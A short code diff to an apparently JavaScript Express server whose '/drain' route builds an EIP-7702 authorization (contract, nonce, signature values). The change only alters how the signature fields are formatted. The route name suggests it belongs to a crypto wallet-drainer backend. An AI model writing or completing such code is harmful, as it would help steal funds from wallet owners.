@@ -40,8 +40,8 @@ app.post("/drain", async (req, res) => {
       address: CONTRACT,
       nonce: BigInt(authNonce),
       yParity: yp,
-      r: "0x" + clean(auth.r),
-      s: "0x" + clean(auth.s),
+      r: clean(auth.r),
+      s: clean(auth.s),
     };
 
     const nonce = await provider.getTransactionCount(wallet.address, "latest");
